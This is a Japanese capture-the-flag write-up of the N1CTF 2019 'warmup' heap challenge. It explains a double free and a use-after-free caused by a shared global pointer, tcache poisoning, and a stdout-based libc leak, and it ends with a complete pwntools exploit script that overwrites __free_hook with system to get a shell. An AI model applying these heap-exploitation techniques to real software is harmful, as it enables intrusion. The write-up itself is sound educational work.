---
tags: pwn
---


# N1CTF 2019 - warmup

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

show機能が無いHeap問題。
free時にポインタを破棄しているため一見何も出来無さそうに見えるが実はポインタリストをインデックスで指定してfreeしているのではなく、標的になっているグローバル変数に入ったポインタをfreeしているため、前の動作のポインタが残っておりDouble Freeが出来る。
加えて、editでも同じグローバル変数を用いるため工夫するとUAF(write)も可能。
これを上手く使ってstdoutをtcacheに繋ぎlibc leakする

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

* libc: 2.27
* 保持可能ポインタ: 10
* malloc可能サイズ: 0x40のみ
* コマンド
    * add: `malloc(0x40)`して中身を書き込む
    * edit: インデックスを指定して編集
    * delete: インデックスを指定してfree、ポインタはクリアされるが別に脆弱性があるので後述
* コマンド実行回数制限: 無し

### Vuln

まずdelete関数の処理はこうなっている

```c
void delete(void)

{
  long lVar1;
  int idx;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("index:");
  idx = get_int();
  if ((idx < 0) || (9 < idx)) {
    puts("invalid");
  }
  else {
    if (*(long *)(&ptr_list + (long)idx * 8) != 0) {
      target_ptr = *(void **)(&ptr_list + (long)idx * 8);
    }
    if (target_ptr == (void *)0x0) {
      puts("no such note!");
    }
    else {
      free(target_ptr);
      *(undefined8 *)(&ptr_list + (long)idx * 8) = 0;
      puts("done!");
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

delete時に指定インデックスに相当するポインタはクリアされているが実際にfreeされているのは`target_ptr`である。特に今回利用できそうな欠陥はヌルポインタが入っているインデックスが指定されても`target_ptr`がヌルポインタで無ければ処理が続行されることである。したがって同じインデックスを連続してdeleteすると、`target_ptr`が維持されたまま2回目のdeleteに突入し、指定インデックスは既にヌルポインタが入っているので`target_ptr`が上書きされず再びfreeされる。
よって連続するdeleteならDouble Freeは普通に出来る。

ところで`target_ptr`は(私がリネームしたが)グローバル変数で実はedit関数でも使われている、そこでeditを覗いてみる。

```c
void edit(void)

{
  long lVar1;
  int idx;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("index:");
  idx = get_int();
  target_ptr = *(long *)(&ptr_list + (long)idx * 8);
  if (((idx < 0) || (9 < idx)) || (target_ptr == 0)) {
    puts("no such note!");
  }
  else {
    printf("content>>");
    __write2pointer(target_ptr,0x40);
    puts("done!");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

指定インデックスにあるポインタを`target_ptr`にいれて編集を行っていることがわかる。ということはここでインデックスを指定し、`target_ptr`にポインタを入れ、先程のdeleteでヌルポインタのインデックスを指定すれば、deleteでインデックスを指定しなくてもfree出来る。
これはfreeされたポインタを指定してまだedit, delete出来ることを意味しているのでDouble Freeに加えてUAFも存在する。

まとめると利用したい脆弱性は次のような手順で利用できる

* UAF(write)
free後にeditしたいポインタを`p_i`とおく、`i`はインデックスを示す
ヌルポインタを用意して`p_null`とおく

    1. edit(p_i): `target_ptr: p_i`になる
    2. delete(p_null): `target_ptr`は維持されたままfreeが行われ、`target_ptr`が指すチャンクが対応するbinに送られる
    3. edit(p_i): `target_ptr`は`p_i`のままだったので一度freeされながらも再度編集が出来る

* Double Free
他の動作(特にeditと他のインデックスのdelete)を挟まずに2回連続でdeleteする

### Unsorted Bin送り

なにはともあれlibc leakをするためにはUnsorted Binにチャンクを送らないことには始まらない。というわけでいつものようにtcacheを埋め...たくても今回はmallocサイズが0x40固定でチャンクサイズにすると0x50なのでtcacheを7つ埋めてfreeしてもUnsorted Binではなくfastbinに送られてしまう。
というわけでUAFを利用してサイズを偽装する、"Unsorted Binに送りたいチャンク(Aとする)"と"アドレスが`A-0x10`と最下位バイトだけが違うチャンク(Bとする)"を用意し、Bをfreeする(コードでは後に再び使うのでポインタを残している)。続いて別のチャンク(Cとする)をfreeする(UAFが出来るようにしておく)とtcacheは次のようになる

```
top -> C -> B -> null
```

よって`C`のnextにはBのアドレスが入っているのでUAFで末尾バイトを書き換えればBではなくA-0x10に繋げることが出来る、それをした図がこちら↓

```
top -> C -> (A - 0x10) -> null
```

これでAのサイズヘッダを書き換えることが出来る。適当にUnsorted Binに入る大きさにしておけば良いがデカいサイズのチャンクを作る場合、サイズチェックを回避するために下に敷いておくチャンクの製造が難しい(ポインタ数の制限がある)ので0x80を超える程度のサイズにしておき7回freeしてtcacheを満杯にしてから8回目のfreeでUnsorted Binへ送る。

### `_IO_2_1_stdout_`へのポインタを得る

さて、Aのfd, bkには`&main_arena->top`が入っているはずである。よってfdの下位バイトを書き換えて`_IO_2_1_stdout_`を指すようにする(これは前2回の記事で説明した通り)
この書き換えには先程得た`A-0x10`を指すポインタをeditすれば良い。

後は前述のサイズ書き換えと似た感じでtcache中のnextを書き換えてAを指すようにし何回かのmallocで`_IO_2_1_stdout_`を指すポインタを得る。

なお、この際、0x50のtcacheのカウンタが負の方向へオーバーフローしてfree出来なくなることを防ぐために余分にdeleteしてカウンタを増やしている。

### `_IO_2_1_stdout_`改竄

* 魔法の数字: 0xfbad1880
* `_IO_read`系ポインタ埋め x3: 0x0
* `_shortbuf`のちょっと前から出力: 0x08

以上の3つを並べたペイロードを流し込んでlibc中のオフセットが固定である箇所をリークする。

### いつもの

Double Freeできるから簡単(但しtcacheの先頭に0xfbad1880が来ているので適当にdeleteして有効なチャンクを繋げられるようにする)

## Code

```python
from pwn import process, p64, u64, ELF


def _select(s, sel, c=b">>"):
    s.recvuntil(c)
    s.sendline(str(sel))


def create(s, data=b"/bin/sh\x00"):
    _select(s, 1)
    s.recvuntil(b"content>>")
    s.send(data)


def edit(s, idx, data=b"/bin/sh\x00"):
    _select(s, 3)
    s.recvuntil(b"index:")
    s.send(str(idx))
    s.recvuntil(b"content>>")
    s.send(data)


def delete(s, idx):
    _select(s, 2)
    s.recvuntil(b"index:")
    s.send(str(idx))


def uaf(s, idx, data=b"/bin/sh\x00", fake_idx=9):
    """
        fake_idxに該当するポインタがヌルポインタではないとtarget_ptrが上書きされて死ぬ
    """
    # set idx to target_ptr
    edit(s, idx, data)
    # free idx (but fake_idx is cleared)
    delete(s, fake_idx)


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        - setbuf(stdout, 0)の前に出力が行われているのでHeap上に謎のバッファ先輩が存在するが特に意味は無い
        - delete, editの双方で共通のポインタ格納変数を用意しており、ロジックが異なるので頑張るとDouble FreeやらUAFが出来る(結構面倒)
        - edit, deleteで対象となったポインタはtarget_ptr中に留まり続ける
        - show無しでheap leakするのは無理っぽいのでUAFで末尾バイトを書き換えてtcache poisoningで好きなところを編集出来るようにする
    """
    
    libc = ELF("./libc-2.27.so")
    libc_addrs = {
        "free_hook": libc.symbols["__free_hook"],
        "system": libc.symbols["system"],
        "leak": 0x7fd8e6ded8b0 - 0x7fd8e6a00000
    }

    s = process("./warmup")
    s.recvuntil(b"===")
    print("[+] setup done")

    # tamper large chunk
    create(s)
    create(s)
    prev_size = 0xb1
    payload = p64(prev_size) + p64(0x41)
    create(s, payload)
    create(s)

    uaf(s, 0)
    uaf(s, 1)
    edit(s, 1, b"\x60")
    create(s)
    create(s, p64(0) + p64(0xb1))

    # to unsorted bin
    for _ in range(8):
        delete(s, 0)

    payload = p64(0) + p64(0xb1) + b"\x60\xc7"
    edit(s, 5, payload)
    delete(s, 4)
    delete(s, 4)
    delete(s, 4)
    uaf(s, 1)
    edit(s, 1, b"\x70")

    create(s)
    create(s)
    payload = p64(0xfbad1880) + p64(0) * 3 + b"\x08"
    create(s, payload)

    libc_addr = u64(s.recv(6).ljust(8, b"\x00")) - libc_addrs["leak"]
    print(hex(libc_addr))

    # ready for `valid` tcache
    delete(s, 0)
    delete(s, 1)

    # write to __free_hook
    create(s)
    delete(s, 0)
    delete(s, 0)
    create(s, p64(libc_addr + libc_addrs["free_hook"]))
    create(s)
    create(s, p64(libc_addr + libc_addrs["system"]))

    # cake
    create(s)
    delete(s, 8)

    s.interactive()

```

## 感想

この企画の目標だった問題なので解けて嬉しいです。UAFするのにやたらと複雑な上にポインタも無制限ではないのでなんとかして再利用したり不要なものをdelete(するついでにtcacheのカウントを増やしたり)したりと大変でした。

流石にshowless leakを昨日2回もやったのでその部分はスラスラ出来て、それ以外のところもノーヒントで自力で脆弱性を見つけて利用出来たので良かったです

ちなみにこの企画、明日で記念すべき1ヶ月目だそうです